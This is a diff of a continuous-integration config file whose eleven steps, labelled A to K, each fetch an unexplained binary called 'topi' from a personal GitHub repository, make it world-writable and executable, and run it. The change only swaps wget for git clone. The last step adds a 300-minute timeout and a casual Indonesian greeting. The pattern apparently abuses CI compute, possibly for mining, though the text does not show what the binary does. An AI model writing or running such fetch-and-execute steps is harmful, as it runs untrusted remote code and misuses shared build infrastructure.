@@ -5,50 +5,50 @@ working_dir: &working_dir ~/app
     - run:
         name: A
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: B
         command: |
           sleep 10s          
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: C
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi 
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi 
     - run:
         name: D
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: E
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: F
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: G
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: H
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: I
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: J
         command: |
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
     - run:
         name: K
         no_output_timeout: 300m
         command: |
           echo "Ijin Berkah Om. . ."
-          wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi
+          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
   working_directory: *working_dir
 
 version: 2.0
